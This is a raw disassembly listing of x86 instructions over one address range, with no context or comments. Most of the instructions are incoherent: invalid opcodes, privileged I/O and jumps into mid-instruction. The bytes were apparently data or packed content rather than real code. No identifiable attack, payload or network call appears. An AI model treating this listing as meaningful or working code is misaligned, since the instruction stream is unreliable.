  41376d:	je     0x413778
  41376f:	stos   DWORD PTR es:[edi],eax
  413770:	xor    al,0x63
  413772:	jecxz  0x4136f4
  413774:	data16 jb 0x413774
  413777:	adc    DWORD PTR [ecx+0x63],0x31
  41377b:	xchg   edi,eax
  41377c:	bound  esi,QWORD PTR [ecx-0x23]
  41377f:	adc    eax,edi
  413781:	xor    al,0xd2
  413783:	inc    ebp
  413784:	xchg   ebp,eax
  413785:	retw   
  413787:	repz sahf 
  413789:	pusha  
  41378a:	sar    BYTE PTR [edi],0xe7
  41378d:	aas    
  41378e:	(bad)  
  41378f:	inc    esp
  413790:	jnp    0x4137b5
  413792:	xor    BYTE PTR [ecx],0x79
  413795:	pop    ecx
  413796:	xchg   edx,eax
  413797:	inc    edx
  413798:	(bad)  
  413799:	mov    al,ss:0x65037931
  41379f:	xor    eax,0x6351585a
  4137a4:	inc    esp
  4137a5:	push   edx
  4137a6:	jg     0x4137d9
  4137a8:	pop    ecx
  4137a9:	and    al,0x61
  4137ab:	xor    eax,0x4831535a
  4137b0:	dec    eax
  4137b1:	push   ebx
  4137b2:	gs hlt 
  4137b4:	sbb    DWORD PTR [ecx+0x63],ebp
  4137b7:	ds dec esp
  4137b9:	push   edx
  4137ba:	adc    DWORD PTR [esi+edi*1+0x52],esp
  4137be:	pop    ebp
  4137bf:	adc    al,0x33
  4137c1:	gs inc eax
  4137c3:	inc    eax
  4137c4:	(bad)  
  4137c5:	xor    dl,BYTE PTR [edx+0x42]
  4137c8:	sbb    eax,0x43000069
  4137cd:	hlt    
  4137ce:	ss gs cmp eax,0xe3fe72c
  4137d5:	inc    ebx
  4137d6:	repz and eax,DWORD PTR [eax]
  4137d9:	xor    ecx,edi
  4137db:	push   ebp
  4137dc:	adc    al,BYTE PTR [edx-0x39]
  4137df:	aaa    
  4137e0:	push   ds
  4137e1:	inc    esp
  4137e2:	int3   
  4137e3:	add    esi,edi
  4137e5:	pop    edi
  4137e6:	mov    bh,0x23
  4137e8:	div    DWORD PTR [ebx*8-0x2ccaeba4]
  4137ef:	pop    esi
  4137f0:	add    edx,DWORD PTR [ebp*4-0x560bfec9]
  4137f7:	pop    esi
  4137f8:	fisubr DWORD PTR [eax]
  4137fa:	add    al,cl
  4137fc:	cld    
  4137fd:	das    
  4137fe:	arpl   WORD PTR [ebx-0x668bd1ce],di
  413804:	out    dx,al
  413805:	cs jno 0x41379d
  413808:	and    al,0x40
  41380a:	js     0x4137a9
  41380c:	xor    bl,BYTE PTR [eax+0x42]
  41380f:	xchg   esp,eax
  413810:	(bad)  
  413811:	daa    
  413812:	arpl   WORD PTR [ebp+0x62],di
  413815:	inc    edx
  413816:	ins    DWORD PTR es:[edi],dx
  413817:	mov    cs,WORD PTR [esp+esi*8+0x40948650]
  41381e:	jne    0x4137a8
  413820:	xor    BYTE PTR [ebx],0x0
  413823:	pop    ss
  413824:	cdq    
  413825:	push   edi
  413826:	je     0x413811
  413828:	and    al,0x32
  41382a:	jo     0x413886
  41382c:	xor    eax,0x476d65
  413831:	add    BYTE PTR [ecx+0x41],bl
  413834:	pop    edi
  413835:	cmp    ebx,DWORD PTR [eax+0x58]
  413838:	inc    edx
  413839:	sbb    DWORD PTR [edi+0x60],ebp
  41383c:	push   eax
  41383d:	adc    eax,0x3d6c4373
  413842:	dec    eax
  413843:	inc    eax
  413844:	and    BYTE PTR [ecx],bh
  413846:	arpl   WORD PTR [ecx],bp
  413848:	ins    DWORD PTR es:[edi],dx
  413849:	pop    es
  41384a:	or     eax,0x139544e
  41384f:	dec    ebx
  413850:	pop    edi
  413851:	add    BYTE PTR [edi+0x14],dl
  413854:	push   ecx
  413855:	push   ss
  413856:	pop    ss
  413857:	inc    eax
  413858:	jne    0x413862
  41385a:	add    esi,DWORD PTR [ebx]
  41385c:	pop    esp
  41385d:	sub    edi,eax
  41385f:	daa    
  413860:	ins    BYTE PTR es:[edi],dx
  413861:	add    al,0xf9
  413863:	arpl   WORD PTR [edx-0x2a],si
  413866:	out    dx,eax
  413867:	sub    eax,0x2de7ba20
  41386c:	je     0x41384c
  41386e:	adc    eax,0xf0ad6342
  413873:	inc    edx
  413874:	ins    BYTE PTR es:[edi],dx
  413875:	add    BYTE PTR [ebx+ebp*1+0x55aa5074],al
  41387c:	imul   esp,DWORD PTR [esi+0x28],0x4e
  413880:	push   esp
  413881:	push   eax
  413882:	sub    BYTE PTR [ebx+0x6c],dl
  413885:	imul   edi,DWORD PTR [ebp-0x6aa38ba8],0x486e652f
  41388f:	add    DWORD PTR [ebx+0x66],ebp
  413892:	pushf  
  413893:	pop    ebp
  413894:	pop    ebp
  413895:	jb     0x413897
  413897:	add    BYTE PTR [ebp-0x31afbe1b],bh
  41389d:	std    
  41389e:	dec    edi
  41389f:	pop    esp
  4138a0:	retf   0x6c5c
  4138a3:	ins    BYTE PTR es:[edi],dx
  4138a4:	lods   eax,DWORD PTR ds:[esi]
  4138a5:	pop    ebp
  4138a6:	and    BYTE PTR [eax+0x6a],dl
  4138a9:	push   edi
  4138aa:	imul   esp,DWORD PTR [esi+0x38],0x4e
  4138ae:	push   esp
  4138af:	push   eax
  4138b0:	inc    esp
  4138b1:	imul   DWORD PTR [edi+0x74]
  4138b4:	jno    0x41390d
  4138b6:	outs   dx,BYTE PTR ds:[esi]
  4138b7:	jae    0x413891
  4138b9:	add    al,0x6b
  4138bb:	data16 sbb al,0x5f
  4138be:	pop    ebp
  4138bf:	jb     0x41392e
  4138c1:	add    al,0x42
  4138c3:	jne    0x4138d9
  4138c5:	xor    al,0x61
  4138c7:	je     0x4138d1
  4138c9:	bound  ebp,QWORD PTR [ebx+0x6f]
  4138cc:	cs lock dec esi
  4138cf:	outs   dx,DWORD PTR ds:[esi]
  4138d0:	cs pop esp
  4138d2:	jae    0x413935
  4138d4:	sbb    ch,BYTE PTR ds:0x55ad425c
  4138da:	ins    BYTE PTR es:[edi],dx
  4138db:	gs pushf 
  4138dd:	add    DWORD PTR [edx+0x6f],esi
  4138e0:	aaa    
  4138e1:	and    BYTE PTR cs:[esi+0x3c],al
  4138e5:	add    BYTE PTR [eax],ah
  4138e7:	inc    ebx
  4138e8:	fs pop edx
  4138ea:	popa   
  4138eb:	outs   dx,BYTE PTR ds:[esi]
  4138ec:	pop    esp
  4138ed:	in     eax,0x4a
  4138ef:	jo     0x413922
  4138f1:	xlat   BYTE PTR ds:[ebx]
  4138f2:	pop    edx
  4138f3:	ins    DWORD PTR es:[edi],dx
  4138f4:	pop    es
  4138f5:	fiadd  DWORD PTR [ecx]
  4138f7:	push   ecx
  4138f8:	faddp  st(4),st
  4138fa:	push   ebp
  4138fb:	jne    0x4138fd
  4138fd:	add    al,dl
  4138ff:	js     0x413967
  413901:	pop    esp
  413902:	repz call 0x5f3d:0xab015443
  41390a:	ret    0x3096
  41390d:	arpl   dx,ax
  41390f:	cdq    
  413910:	pop    edx
  413911:	ins    DWORD PTR es:[edi],dx
  413912:	iret   
  413913:	fs pop edx
  413915:	ins    BYTE PTR es:[edi],dx
  413916:	int3   
  413917:	stos   BYTE PTR es:[edi],al
  413918:	xor    BYTE PTR [edi-0x5b],ah
  41391b:	mov    BYTE PTR [eax+0x44],dl
  41391e:	cwde   
  41391f:	cmp    DWORD PTR [ecx],eax
  413921:	inc    edi
  413922:	(bad)  
  413923:	cmp    dl,BYTE PTR [ebp+0x5f]
  413926:	test   DWORD PTR [edi],esi
  413928:	inc    ebp
  413929:	sbb    DWORD PTR [si],0x4
  41392d:	mov    DWORD PTR cs:[eax+0x60],ecx
  413931:	add    BYTE PTR [ebp-0x6],bl
  413934:	pop    esp
  413935:	pop    edi
  413936:	sbb    DWORD PTR [edi+0x46],0x54
  41393a:	sub    DWORD PTR [ebx+0x465f5f43],0x48656752
  413944:	dec    edi
  413945:	cs dec ebp
  413947:	dec    esp
  413948:	pop    eax
  413949:	add    BYTE PTR [ecx+0x24],bh
  41394c:	dec    edi
  41394d:	je     0x4139a5
  41394f:	sbb    DWORD PTR [ecx+0x2e],ecx
  413952:	push   ebp
  413953:	or     al,0x58
  413955:	add    BYTE PTR [eax+0xf],dl
  413958:	push   0x1e221372
  41395d:	adc    BYTE PTR fs:[edi+0x6f01],bh
  413964:	and    al,0x14
  413966:	pop    edi
  413967:	imul   eax,DWORD PTR [edi+0xf],0x14317461
  41396e:	ret    
  41396f:	aaa    
  413970:	add    al,BYTE PTR [edx-0x37]
  413973:	pop    esp
  413974:	neg    DWORD PTR [edi-0x49]
  413977:	add    esp,eax
  413979:	and    al,0xc5
  41397b:	push   edi
  41397c:	in     al,0x32
  41397e:	mov    ecx,0xb4600566
  413983:	push   ecx
  413984:	shl    DWORD PTR [ebp*4-0x3febfec9],cl
  41398b:	pop    ebp
  41398c:	sar    BYTE PTR [edi],0x88
  41398f:	pop    edi
  413990:	aad    0x43
  413992:	mov    BYTE PTR [edi-0x37],dl
  413995:	adc    edi,DWORD PTR [edx-0x69c030a4]
  41399b:	bound  esp,QWORD PTR [ebx-0x6bcf5cc7]
  4139a1:	sub    BYTE PTR [eax-0x52a588d1],cl
  4139a7:	aaa    
  4139a8:	adc    DWORD PTR [edx+ebp*4],0x4c389251
  4139af:	pop    edx
  4139b0:	jge    0x4139ef
  4139b2:	dec    eax
  4139b3:	pop    eax
  4139b4:	pusha  
  4139b5:	xor    eax,0x57315043
  4139ba:	pop    ecx
  4139bb:	popa   
  4139bc:	push   ebp
  4139bd:	cmp    DWORD PTR [ebp+0x50],edx
  4139c0:	dec    esi
  4139c1:	xor    eax,0x3949474b
  4139c6:	dec    edx
  4139c7:	pop    edi
  4139c8:	add    BYTE PTR [eax],al
  4139ca:	xor    DWORD PTR [edi+0x3e],eax
  4139cd:	bound  eax,QWORD PTR [ebp+0x2b]
  4139d0:	or     BYTE PTR [esi+0x52],dl
  4139d3:	push   eax
  4139d4:	cmp    bl,BYTE PTR [ebx+0x45]
  4139d7:	xor    eax,0x5a6f4233
  4139dc:	xor    esi,DWORD PTR [ecx*1+0xe4ff763]
  4139e3:	inc    ebx
  4139e4:	or     eax,0x443157
  4139e9:	or     dh,bh
  4139eb:	and    al,0x75
  4139ed:	(bad)  
  4139ee:	in     al,0x37
  4139f0:	add    BYTE PTR [edi+ebx*8+0x15af7236],bh
  4139f7:	aas    
  4139f8:	arpl   cx,bp
  4139fa:	cmp    al,BYTE PTR [ecx+0x71]
  4139fd:	aad    0xf5
  4139ff:	aaa    
  413a00:	jb     0x4139bc
  413a02:	xor    al,BYTE PTR [esi+0x63]
  413a05:	int3   
  413a06:	sti    
  413a07:	daa    
  413a08:	arpl   WORD PTR [ebp-0x66ffda0b],bp
  413a0e:	jmp    0x413a35
  413a10:	je     0x4139fb
  413a12:	or     al,BYTE PTR [ecx+0x71]
  413a15:	xchg   ebp,eax
  413a16:	clc    
  413a17:	push   edx
  413a18:	imul   ecx,DWORD PTR [edx+esi*1+0x7e9b6d44],0x14
  413a20:	push   ebx
  413a21:	jp     0x4139b4
  413a23:	outs   dx,BYTE PTR es:[esi]
  413a25:	mov    BYTE PTR [ecx+0x37],bh
  413a28:	add    BYTE PTR [ecx+0x7671258d],bl
  413a2e:	add    BYTE PTR [eax],al
  413a30:	imul   esp,DWORD PTR [esi],0x64
  413a33:	jmp    0x55b27b82
  413a38:	jno    0x413a75
  413a3a:	jb     0x413a63
  413a3c:	mov    WORD PTR [edi],?
  413a3e:	arpl   cx,bp
  413a40:	daa    
  413a41:	inc    ecx
  413a42:	cmp    ax,0x5382
  413a46:	jb     0x413a8c
  413a48:	or     DWORD PTR [ebp+0x6d],edx
  413a4b:	dec    edi
  413a4c:	push   ebx
  413a4d:	aaa    
  413a4e:	arpl   WORD PTR [edx],bp
  413a50:	pusha  
  413a51:	and    al,0x20
  413a53:	cmp    ch,BYTE PTR [edx+0x3a]
  413a56:	je     0x413a6e
  413a58:	push   esp
  413a59:	arpl   WORD PTR es:0x47441f4,si
  413a60:	pop    es
  413a61:	inc    edx
  413a62:	arpl   WORD PTR [eax],ax
  413a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a65:	cli    
  413a66:	dec    edi
  413a67:	jb     0x413a98
  413a69:	ss gs ins BYTE PTR es:[edi],dx
  413a6c:	and    eax,0x8f53004b
  413a71:	xor    al,0x74
  413a73:	ja     0x413aee
  413a75:	dec    eax
  413a76:	popa   
  413a77:	pop    esp
  413a78:	(bad)  
  413a79:	add    dl,BYTE PTR [eax+0x57]
  413a7c:	imul   ecx,DWORD PTR [eax+0x61],0x51ed9b5c
  413a83:	inc    ebp
  413a84:	xchg   esi,eax
  413a85:	add    dl,BYTE PTR [eax+0x5c]
  413a88:	mov    ebx,0x9b65744f
  413a8d:	push   ss
  413a8e:	dec    eax
  413a8f:	outs   dx,DWORD PTR ds:[esi]
  413a90:	mov    esp,DWORD PTR [edx+0x0]
  413a93:	push   ebp
  413a94:	add    BYTE PTR [eax],al
  413a96:	stos   DWORD PTR es:[edi],eax
  413a97:	xor    esi,DWORD PTR [edx+0x0]
  413a9a:	js     0x413ae9
  413a9c:	jb     0x413b12
  413a9e:	dec    eax
  413a9f:	out    0x52,al
  413aa1:	add    al,ch
  413aa3:	popa   
  413aa4:	push   0x4eeb1852
  413aa9:	dec    eax
  413aaa:	or     BYTE PTR [esi+0x72],al
  413aad:	outs   dx,DWORD PTR ds:[esi]
  413aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413aaf:	push   eax
  413ab0:	ins    BYTE PTR es:[edi],dx
  413ab1:	mov    ecx,DWORD PTR gs:[ebx]
  413ab4:	js     0x413b23
  413ab6:	pop    esp
  413ab7:	sbb    BYTE PTR [esi+eax*2+0x44],bl
  413abb:	call   0x48a17fdf
  413ac0:	ins    BYTE PTR es:[edi],dx
  413ac1:	outs   dx,DWORD PTR ds:[esi]
  413ac2:	mov    dl,BYTE PTR [ecx+0x72]
  413ac5:	add    BYTE PTR [ebx+0x4b],cl
  413ac8:	data16 je 0x413af2
  413acb:	xor    eax,0x563c6572
  413ad0:	push   esp
  413ad1:	push   eax
  413ad2:	cmp    cl,dh
  413ad4:	ja     0x413b46
  413ad6:	sbb    al,0x4b
  413ad8:	jb     0x413b3f
  413ada:	sbb    bh,ah
  413adc:	inc    ebp
  413add:	push   esp
  413ade:	xor    ebx,ebp
  413ae0:	and    eax,DWORD PTR [ebx+0x29]
  413ae3:	or     ebx,DWORD PTR [eax+0x6d]
  413ae6:	and    esp,DWORD PTR [eax]
  413ae8:	push   esi
  413ae9:	pop    esp
  413aea:	push   es
  413aeb:	and    dl,BYTE PTR [esi+0x69]
  413aee:	and    ch,BYTE PTR [ebx+0x1f146162]
  413af4:	xor    eax,0x586ef246
  413af9:	ins    DWORD PTR es:[edi],dx
  413afa:	add    BYTE PTR [eax],al
  413afc:	or     eax,0x4472627d
  413b01:	or     eax,0x7d313416
  413b06:	dec    esi
  413b07:	je     0x413ae6
  413b09:	leave  
  413b0a:	push   edi
  413b0b:	jno    0x413b3e
  413b0d:	mov    ds,WORD PTR [eax+0x66]
  413b10:	fnsave [ecx+0x62]
  413b13:	jb     0x413ae9
  413b15:	sahf   
  413b16:	aas    
  413b17:	push   esp
  413b18:	loope  0x413af4
  413b1a:	ds js  0x413ade
  413b1d:	sahf   
  413b1e:	pop    eax
  413b1f:	jb     0x413aed
  413b21:	mov    WORD PTR ds:0x5f32a350,fs
  413b27:	addr16 xchg ebp,eax
  413b29:	mov    al,ds:0x9c810054
  413b2e:	push   esp
  413b2f:	jno    0x413acf
  413b31:	call   0x7162:0x8b316453
  413b38:	adc    BYTE PTR [edx+0x57],0x72
  413b3c:	xchg   ebp,eax
  413b3d:	out    0x48,eax
  413b3f:	jo     0x413acd
  413b41:	mov    ebx,0x47626d39
  413b46:	add    al,0x4c
  413b48:	push   esi
  413b49:	bound  ebx,QWORD PTR [ecx+0x6e]
  413b4c:	xor    DWORD PTR [ebx],ecx
  413b4e:	push   edi
  413b4f:	jb     0x413bae
  413b51:	mov    ebx,0xe7586e3a
  413b56:	pop    eax
  413b57:	pop    edi
  413b58:	push   ebp
  413b59:	adc    al,0x37
  413b5b:	arpl   WORD PTR [ebp+0x3c],ax
  413b5e:	out    0x41,eax
  413b60:	add    BYTE PTR [eax],al
  413b62:	cmp    eax,0x255b3a24
  413b67:	aaa    
  413b68:	mov    ebp,0xe7401a4b
  413b6d:	daa    
  413b6e:	mul    DWORD PTR ds:0x27f66110
  413b74:	or     al,0x15
  413b76:	xor    DWORD PTR [edx],eax
  413b78:	add    BYTE PTR [edx+0xe],bl
  413b7b:	adc    al,0xc3
  413b7d:	xor    esi,ebx
  413b7f:	inc    ecx
  413b80:	mov    ds:0xb337084a,eax
  413b85:	inc    esp
  413b86:	fadd   QWORD PTR [ecx-0x3b]
  413b89:	pop    edx
  413b8a:	int3   
  413b8b:	dec    edi
  413b8c:	call   0xc758:0xd024e05e
  413b93:	and    al,0xe7
  413b95:	daa    
  413b96:	loopne 0x413bce
  413b98:	mov    edx,0x9540ce54
  413b9d:	push   esp
  413b9e:	xor    DWORD PTR [ebp-0x72],eax
  413ba1:	popa   
  413ba2:	mov    ebp,0x92558828
  413ba7:	push   eax
  413ba8:	mov    ch,0x62
  413baa:	xchg   edi,eax
  413bab:	pop    eax
  413bac:	sbb    BYTE PTR [edx+edx*4+0x50],0x9a
  413bb1:	pop    esi
  413bb2:	nop
  413bb3:	sub    DWORD PTR [ecx+0x5e],edi
  413bb6:	ja     0x413c04
  413bb8:	out    0x44,eax
  413bba:	xchg   esp,eax
  413bbb:	ds dec ebp
  413bbd:	pop    ebp
  413bbe:	xchg   esp,eax
  413bbf:	hlt    
  413bc0:	ss gs jge 0x413c00
  413bc4:	out    0x30,eax
  413bc6:	add    BYTE PTR [eax],al
  413bc8:	pop    ebp
  413bc9:	sub    BYTE PTR [ecx+0x65],bl
  413bcc:	outs   dx,DWORD PTR ds:[esi]
  413bcd:	dec    esp
  413bce:	pop    ss
  413bcf:	add    al,0x7d
  413bd1:	and    edx,DWORD PTR [eax+0x50]
  413bd4:	push   edx
  413bd5:	and    eax,DWORD PTR [eax]
  413bd7:	pop    es
  413bd8:	jge    0x413c15
  413bda:	ins    BYTE PTR es:[edi],dx
  413bdb:	jmp    0x399591ee
  413be0:	add    esp,DWORD PTR [ebx]
  413be2:	jno    0x413bf5
  413be4:	sub    eax,0xd1a7342
  413be9:	inc    ebp
  413bea:	addr16 adc eax,0x1477fe10
  413bf0:	stc    
  413bf1:	adc    edx,DWORD PTR [ecx+0x4]
  413bf4:	add    esp,DWORD PTR [esi]
  413bf6:	arpl   bx,di
  413bf8:	xor    al,BYTE PTR [ebx+0x71]
  413bfb:	add    al,0xe3
  413bfd:	cmp    eax,0x1411d45f
  413c02:	push   eax
  413c03:	enter  0x24e3,0x75
  413c07:	mov    BYTE PTR [eax],0x38
  413c0a:	add    BYTE PTR [edi-0x29afdc0a],ah
  413c10:	add    BYTE PTR [eax],ch
  413c12:	add    BYTE PTR [edx-0x418bca01],bl
  413c18:	aad    0x21
  413c1a:	arpl   WORD PTR [ebp-0x7388de0d],cx
  413c20:	loopne 0x413c71
  413c22:	push   ebp
  413c23:	test   al,dl
  413c25:	inc    esp
  413c26:	addr16 popf 
  413c28:	xchg   ecx,eax
  413c29:	inc    esp
  413c2a:	jae    0x413bb7
  413c2c:	add    BYTE PTR [eax],al
  413c2e:	jle    0x413c67
  413c30:	jno    0x413bc3
  413c32:	xchg   ecx,eax
  413c33:	and    al,BYTE PTR [eax]
  413c35:	popf   
  413c36:	jo     0x413c6f
  413c38:	je     0x413bdc
  413c3a:	ins    DWORD PTR es:[edi],dx
  413c3b:	arpl   WORD PTR ds:[ecx+0x32],si
  413c3f:	xor    ah,BYTE PTR [edi+0x5d]
  413c42:	pop    edx
  413c43:	aaa    
  413c44:	outs   dx,BYTE PTR ds:[esi]
  413c45:	inc    esp
  413c46:	gs (bad) 
  413c48:	arpl   WORD PTR [edx+0x35],bx
  413c4b:	pop    esp
  413c4c:	ins    DWORD PTR es:[edi],dx
  413c4d:	pop    edx
  413c4e:	cmp    DWORD PTR [esi],0x3585005f
  413c54:	add    BYTE PTR [ebp+0x1b],dl
  413c57:	xor    eax,0x4d796e72
  413c5c:	popa   
  413c5d:	add    BYTE PTR [eax],ch
  413c5f:	cmp    DWORD PTR [edi+0x73],ebp
  413c62:	pop    ds
  413c63:	inc    edi
  413c64:	jb     0x413cca
  413c66:	enter  0x6ae2,0x72
  413c6a:	dec    esp
  413c6b:	sbb    BYTE PTR [edi+0x6f],cl
  413c6e:	cs inc esp
  413c70:	jae    0x413cd3
  413c72:	call   0x5d48:0x30455c33
  413c79:	outs   dx,BYTE PTR ds:[esi]
  413c7a:	pop    esp
  413c7b:	inc    edx
  413c7c:	gs jbe 0x413cac
  413c7f:	cld    
  413c80:	dec    esi
  413c81:	gs pop ebx
  413c83:	inc    ecx
  413c84:	outs   dx,DWORD PTR gs:[esi]
  413c86:	inc    cx
  413c88:	add    BYTE PTR [ebp+ebx*4+0x5a],bl
  413c8c:	jo     0x413cef
  413c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c8f:	out    dx,al
  413c90:	jno    0x413cfb
  413c92:	add    BYTE PTR [eax],al
  413c94:	sahf   
  413c95:	xor    eax,DWORD PTR [eax]
  413c97:	pop    esp
  413c98:	ins    BYTE PTR es:[edi],dx
  413c99:	inc    esp
  413c9a:	gs jbe 0x413d1a
  413c9d:	inc    ecx
  413c9e:	cs push 0xffffff8b
  413ca1:	adc    ah,BYTE PTR [edx]
  413ca3:	jo     0x413c4e
  413ca5:	inc    ecx
  413ca6:	outs   dx,DWORD PTR ds:[esi]
  413ca7:	ja     0x413c50
  413ca9:	inc    esp
  413caa:	fs and bh,al
  413cad:	sbb    esp,DWORD PTR [eax]
  413caf:	and    bl,BYTE PTR [eax]
  413cb1:	hlt    
  413cb2:	sub    eax,DWORD PTR [eax]
  413cb4:	mov    ebx,0x9f746646
  413cb9:	cmp    BYTE PTR [edx+0x65],dh
  413cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cbd:	push   esp
  413cbe:	js     0x413d30
  413cc0:	mov    ecx,0x61724447
  413cc5:	pop    esi
  413cc6:	popa   
  413cc7:	add    BYTE PTR [ebp+0x60],cl
  413cca:	jo     0x413d2d
  413ccc:	xor    DWORD PTR [ebp+0x40],edx
  413ccf:	jb     0x413d29
  413cd1:	inc    ebp
  413cd2:	pop    ebp
  413cd3:	pop    ebp
  413cd4:	imul   eax,DWORD PTR [esi+0x55],0x5d0a3163
  413cdb:	jb     0x413d24
  413cdd:	pusha  
  413cde:	push   edx
  413cdf:	add    BYTE PTR [edx+ebp*8+0x5c],bl
  413ce3:	jb     0x413d54
  413ce5:	sbb    al,0x55
  413ce7:	arpl   WORD PTR [ecx],si
  413ce9:	jmp    0x413d4b
  413ceb:	jno    0x413d0f
  413ced:	push   cs
  413cee:	push   ebx
  413cef:	jb     0x413cfe
  413cf1:	mov    ebx,0xaa105024
  413cf6:	push   eax
  413cf7:	jne    0x413cf9
  413cf9:	add    BYTE PTR [esi],al
  413cfb:	test   eax,0x13f5005d
  413d00:	push   edx
  413d01:	arpl   WORD PTR [edx],dx
  413d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d04:	push   esp
  413d05:	jb     0x413cff
  413d07:	mov    edx,0xc70f6d30
  413d0c:	dec    esp
  413d0d:	pop    edi
  413d0e:	jecxz  0x413cef
  413d10:	and    eax,0x2172f24e
  413d15:	push   ecx
  413d16:	into   
  413d17:	fmul   QWORD PTR [ebp+0x75]
  413d1a:	shr    BYTE PTR [eax+0x5e],1
  413d1d:	pop    esp
  413d1e:	repnz (bad) 
  413d20:	bound  esi,QWORD PTR [ecx-0x3e]
  413d23:	shl    DWORD PTR [eax+0x46],cl
  413d26:	in     eax,0x6a
  413d28:	and    eax,0x426add46
  413d2d:	popa   
  413d2e:	xchg   edx,eax
  413d2f:	xchg   esi,eax
  413d30:	dec    esi
  413d31:	outs   dx,BYTE PTR ds:[esi]
  413d32:	popf   
  413d33:	mov    al,BYTE PTR [ecx]
  413d35:	inc    esi
  413d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d37:	sub    esi,DWORD PTR [eax]
  413d39:	arpl   WORD PTR [ebx+0x31725e25],sp
  413d3f:	jge    0x413d8e
  413d41:	jo     0x413d9f
  413d43:	sub    bl,BYTE PTR [esi+0x72]
  413d46:	outs   dx,DWORD PTR ds:[esi]
  413d47:	adc    al,0x48
  413d49:	push   edi
  413d4a:	xchg   edx,eax
  413d4b:	adc    al,0x25
  413d4d:	push   eax
  413d4e:	popa   
  413d4f:	inc    esp
  413d50:	dec    eax
  413d51:	push   ecx
  413d52:	pusha  
  413d53:	and    eax,0x1455523e
  413d58:	es ds pop ebp
  413d5b:	and    al,0x17
  413d5d:	arpl   WORD PTR [eax],ax
  413d5f:	add    BYTE PTR [eax+0x21],al
  413d62:	ds push ebp
  413d64:	inc    ebx
  413d65:	cmp    bh,ah
  413d67:	cmp    eax,0x5b2b2445
  413d6c:	inc    ebx
  413d6d:	aaa    
  413d6e:	or     dl,BYTE PTR [eax+0x1c]
  413d71:	and    dl,BYTE PTR [eax]
  413d73:	add    al,0x0
  413d75:	pop    ebp
  413d76:	and    eax,0x19530430
  413d7b:	aas    
  413d7c:	cmc    
  413d7d:	pop    ebp
  413d7e:	sub    bh,BYTE PTR [ecx+edx*2]
  413d81:	inc    ecx
  413d82:	push   es
  413d83:	pop    esi
  413d84:	std    
  413d85:	and    al,0x8
  413d87:	push   edx
  413d88:	adc    dl,BYTE PTR [eax-0x53]
  413d8b:	push   edi
  413d8c:	push   cs
  413d8d:	ds (bad) 
  413d8f:	daa    
  413d90:	cs xor edx,ecx
  413d93:	push   esp
  413d94:	loop   0x413dd3
  413d96:	rcl    DWORD PTR [eax+0x31],cl
  413d99:	inc    ecx
  413d9a:	(bad)  
  413d9b:	pop    ebp
  413d9c:	frstor [eax+ecx*8]
  413d9f:	push   ecx
  413da0:	ror    BYTE PTR [edi-0x53],cl
  413da3:	das    
  413da4:	loope  0x413df6
  413da6:	mov    ebx,0x9b3dd25a
  413dab:	daa    
  413dac:	loopne 0x413de8
  413dae:	xchg   ebx,eax
  413daf:	pop    esi
  413db0:	mov    al,ds:0x8f54ba14
  413db5:	and    BYTE PTR [esi-0x5cce5c9e],dl
  413dbb:	xor    BYTE PTR [edx+esi*1+0x3b5f2b73],al
  413dc2:	add    BYTE PTR [ebx+0x0],bh
  413dc5:	add    BYTE PTR [ebp+0x48],ah
  413dc8:	inc    esi
  413dc9:	xchg   ebp,eax
  413dca:	inc    edx
  413dcb:	push   ebp
  413dcc:	ins    BYTE PTR es:[edi],dx
  413dcd:	push   eax
  413dce:	dec    eax
  413dcf:	cmp    dh,BYTE PTR [ebp+edi*1-0x7a]
  413dd3:	xor    esi,DWORD PTR [esp+ecx*2+0x1e]
  413dd7:	adc    al,0x2e
  413dd9:	ds sbb eax,0x22170035
  413ddf:	cmp    BYTE PTR [ecx+ebp*8+0x6e],ch
  413de3:	push   ecx
  413de4:	push   eax
  413de5:	sbb    al,BYTE PTR [edx]
  413de7:	xor    dh,BYTE PTR [esi+esi*1+0x14]
  413deb:	arpl   WORD PTR es:[ebp+0x69],ax
  413def:	xor    esi,DWORD PTR [edx+0x4]
  413df2:	push   esi
  413df3:	and    BYTE PTR [ebp+0x1b],ch
  413df6:	fs hlt 
  413df8:	dec    esp
  413df9:	sbb    DWORD PTR [eax+0x25],ebx
  413dfc:	add    BYTE PTR ds:0xfb5f3bfe,ah
  413e02:	pop    ecx
  413e03:	xor    BYTE PTR [ecx+0xc],dl
  413e06:	dec    ecx
  413e07:	and    BYTE PTR [edi-0x1],ah
  413e0a:	dec    ebx
  413e0b:	and    eax,0x254fca2e
  413e10:	add    BYTE PTR [ebp-0x24a0c3f9],bh
  413e16:	sbb    DWORD PTR [eax],esi
  413e18:	push   ecx
  413e19:	les    esp,FWORD PTR [esi]
  413e1b:	and    BYTE PTR [edi-0x29],ah
  413e1e:	or     esp,DWORD PTR ds:0xe3d3f85d
  413e24:	pop    esp
  413e25:	cld    
  413e26:	inc    eax
  413e27:	xor    al,0x61
  413e29:	mov    edx,0x48320000
  413e2e:	push   ecx
  413e2f:	xchg   ecx,eax
  413e30:	or     eax,0x87856326
  413e35:	aaa    
  413e36:	je     0x413dd5
  413e38:	push   ebp
  413e39:	cmp    ah,BYTE PTR [ebp-0x66]
  413e3c:	and    BYTE PTR [edi+ebp*2],ah
  413e3f:	add    BYTE PTR [edi+esi*8+0x4b186573],bh
  413e46:	dec    edi
  413e47:	push   0x6460e0b9
  413e4c:	fwait
  413e4d:	sti    
  413e4e:	jae    0x413ec4
  413e50:	popa   
  413e51:	out    0x62,al
  413e53:	jae    0x413e84
  413e55:	mov    eax,ds:0xad1f305c
  413e5a:	sub    esi,DWORD PTR [ebx+0x79]
  413e5d:	in     al,0x64
  413e5f:	je     0x413ec6
  413e61:	adc    BYTE PTR [ebx+eax*2+0x7f],bl
  413e65:	(bad)  
  413e66:	gs gs jne 0x413ebd
  413e6a:	jno    0x413edc
  413e6c:	sub    BYTE PTR [ebx+0x6b],al
  413e6f:	data16 adc al,0xef
  413e72:	pop    esp
  413e73:	jb     0x413eaa
  413e75:	adc    BYTE PTR [ebp+eiz*2+0x39],ch
  413e79:	loopne 0x413ee0
  413e7b:	je     0x413eb5
  413e7d:	adc    BYTE PTR [ecx+0x6e],dh
  413e80:	cmp    al,0xfd
  413e82:	pop    esp
  413e83:	jo     0x413f03
  413e85:	sti    
  413e86:	ja     0x413eed
  413e88:	cwde   
  413e89:	loope  0x413eef
